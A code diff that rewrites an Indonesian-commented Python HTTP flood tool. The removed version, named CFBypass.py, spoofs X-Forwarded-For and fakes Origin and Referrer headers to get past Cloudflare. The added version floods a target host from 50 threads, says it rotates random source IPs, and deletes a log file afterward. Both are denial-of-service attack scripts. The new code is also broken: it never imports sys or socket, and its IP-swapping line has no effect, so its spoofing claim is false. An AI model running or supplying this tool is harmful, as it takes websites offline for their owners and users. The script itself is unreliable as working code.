@@ -1,65 +1,55 @@
-import requests
-import random
 import time
 import threading
-import sys
+import random
+import requests
+import os
 
-def random_byte():
-    return random.randint(0, 255)
+# URL untuk menguji flood
+url = "http://example.com"
 
-def random_string_generate(length):
-    characters = 'abcdefghijklmnopqrstuvwxyz0123456789'
-    characters_length = len(characters)
-    result = ''
-    for _ in range(length):
-        result += characters[random.randint(0, characters_length - 1)]
-    return result
+# Fungsi untuk membuat IP acak
+def get_random_ip():
+    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"
 
-def main():
-    if len(sys.argv) <= 2:
-        print("Penggunaan: python CFBypass.py <url> <waktu>")
-        sys.exit(-1)
-
-    url = sys.argv[1]
-    waktu = int(sys.argv[2])
-
-    def get_website_data():
+# Fungsi untuk melakukan request
+def make_request(host, num_requests):
+    while num_requests > 0:
         try:
-            res = requests.get(url)
-            cookie = res.headers.get('Set-Cookie')
-            user_agent = res.headers.get('User-Agent')
+            # Mengganti IP Anda dengan IP lain yang acak
+            ip = get_random_ip()
+            socket.gethostbyname_ex('www.google.com')[2][0] = ip
+            response = requests.get(f"{host}")
+            response.raise_for_status()
+            # Operasi CPU intensif
+            for _ in range(1000000):
+                random.randint(1, 100)
+            response.close()
+        except requests.exceptions.RequestException as e:
+            print(f"Error: {e}")
+        finally:
+            num_requests -= 1
+            time.sleep(0.01)
 
-            if user_agent is None:
-                with open('ua.txt', 'r') as f:
-                    user_agent = f.read().strip()
-            else:
-                user_agent = user_agent
-
-            random_string = random_string_generate(10)
-            fake_ip = f"{random_byte()}.{random_byte()}.{random_byte()}.{random_byte()}"
-
-            options = {
-                'url': url,
-                'headers': {
-                    'User-Agent': user_agent,
-                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
-                    'Upgrade-Insecure-Requests': 1,
-                    'cookie': cookie,
-                    'Origin': f"http://{random_string}.com",
-                    'Referrer': f"http://google.com/{random_string}",
-                    'X-Forwarded-For': fake_ip
-                }
-            }
-
-            requests.get(options['url'], headers=options['headers'])
-        except Exception as e:
-            print(f"Terjadi kesalahan: {e}")
-
-    threading.Thread(target=get_website_data).start()
-
-    time.sleep(waktu)
-
-    print("Pemintaan selesai.")
-
+# Jalankan request secara paralel
 if __name__ == "__main__":
-    main()
+    if len(sys.argv) != 3:
+        print("Usage: python dsa.py <host> <num_requests>")
+        sys.exit(1)
+
+    host = sys.argv[1]
+    num_requests = int(sys.argv[2])
+
+    threads = []
+    for _ in range(50):
+        t = threading.Thread(target=make_request, args=(host, num_requests))
+        threads.append(t)
+        t.start()
+
+    # Tunggu hingga semua request selesai
+    for t in threads:
+        t.join()
+
+    print("Flood selesai!")
+
+    # Menghapus file log
+    os.remove("log.txt")
